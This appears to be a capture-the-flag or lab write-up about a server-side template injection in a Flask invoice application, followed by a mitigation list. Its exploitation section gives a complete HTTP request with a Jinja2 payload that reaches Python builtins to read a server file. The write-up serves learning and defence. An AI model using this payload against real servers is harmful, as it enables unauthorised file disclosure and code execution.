# Flask/Jinja2 SSTI - invoicepanel.hv

## 🎯 Objective
Exploit a Server-Side Template Injection (SSTI) vulnerability in a Flask application to read arbitrary files from the server filesystem.

## 🔍 Vulnerability Analysis
- **Type:** Server-Side Template Injection (SSTI)
- **Endpoint:** `POST /create_invoice`
- **Parameter:** `name`
- **Detection:** User input directly rendered in Jinja2 template context without sanitization
- **Impact:** Arbitrary code execution leading to file disclosure

## 💥 Exploitation
```http
POST /create_invoice HTTP/1.1
Host: invoicepanel.hv
Content-Type: application/x-www-form-urlencoded

name={{ get_flashed_messages.__globals__.__builtins__.open('/home/secret.txt').read() }}
Result: Successfully read /home/secret.txt contents through template engine code execution.

🛡️ Mitigation Strategies
Input Sanitization: Validate and sanitize all user inputs before template rendering

Sandboxing: Use Jinja2 sandboxed environments for untrusted templates

Whitelisting: Implement allowed character/filter whitelists

Context Awareness: Use appropriate template contexts ({{ }} vs {% %})

📊 Skills Demonstrated
SSTI Detection: Identifying template injection points in web applications

Python Object Traversal: Navigating class hierarchies in template engines

Payload Crafting: Developing SSTI payloads for file disclosure

Impact Assessment: Understanding server-side code execution implications

Conducted in controlled environment for educational purposes
